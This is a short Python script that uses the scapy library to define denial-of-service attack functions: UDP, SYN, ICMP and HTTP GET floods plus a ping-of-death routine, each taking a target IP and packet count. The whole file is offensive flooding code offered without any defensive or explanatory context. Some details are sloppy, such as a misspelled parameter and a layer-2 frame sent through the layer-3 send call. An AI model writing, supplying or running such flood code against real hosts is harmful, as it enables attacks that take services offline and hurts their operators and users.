from scapy.all import *


def udpflood(targetip, targetport, number, size):
    ip = IP(dst=targetip)
    udp = UDP(dport=targetport, sport=RandShort())
    data = Raw(b"X" * size)
    packet = ip / udp / data
    send(packet , count=number, verbose=0)

def synflood (targetip, targetport, number, size):
    ip = IP(dst=targetip)
    tcp = TCP(sport=RandShort(), dport=targetport, flags="S")
    data = Raw(b"X" * size)
    p = ip / tcp / data
    send(p, count=number, verbose=0)

def icmpflood (targetip, targertport, number, size):
    ip = IP(dst=targetip)
    data = Raw(b"X" * size)
    p = ip / ICMP() / data
    send(p, count=number, verbose=0)

def httpflood(target_ip, targetport, number, size):
    http_get = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
    payload = http_get.encode("utf-8")
    request = Ether() / IP(dst=target_ip) / TCP(dport=targetport, sport=RandShort()) / payload
    send(request, count=number, verbose=0)


def pingofdeath(targetip):
    send(fragment(IP(dst=targetip)/ICMP()/("X"*60000)))


